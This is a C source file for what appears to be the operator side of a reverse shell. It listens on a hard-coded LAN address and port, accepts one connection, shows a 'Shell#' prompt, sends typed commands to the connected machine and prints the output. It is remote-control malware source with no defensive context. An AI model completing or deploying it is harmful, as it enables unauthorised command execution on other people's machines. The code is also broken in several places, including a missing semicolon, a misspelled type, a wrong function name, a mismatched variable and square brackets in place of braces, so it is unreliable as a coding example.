#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

int main()
{
    int sock, client_sockets;
    char buffer[1024];
    char response[18384];
    struct sockaddr_in server_address, client_address;
    int i=0;
    int optval = 1;
    sockletn_t client_length;

    sock = socket(AF_INET, SOCK_STREAM, 0)
    if(setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval)) < 0) {
        print("\nError Setting up TCP Socket Options");
        return 1;
    }

    server_address.sin_family = AF_INET;
    server_address.sin_addr.s_addr = inet_addr("192.168.0.102");
    server_address.sin_port = htons(50005);

    bind(sock, (struct sockaddr *) &server_address, sizeof(server_address));
    listen(sock, 5);
    client_length = sizeof(client_address);
    client_socket = accept(sock, (struct sockaddr *) &client_address, &client_length);

    while(1){
        jump:
        bzero(&buffer, sizeof(buffer));
        bzero(&response, sizeof(response));
        //dir
        printf("* Shell#%s~$", inet_ntoa(client_address.sin_addr));
        fgets(buffer, sizeof(buffer), stdin);
        strtok(buffer, "\n");
        write(client_socket, buffer, sizeof(buffer));
        if(strncmp("q", buffer, 1)==0) {
            break;
        }
        else [
            recv(client_socket, response, sizeof(response), MSG_WAITALL);
            printf("%s", response);
        ]
    }
} 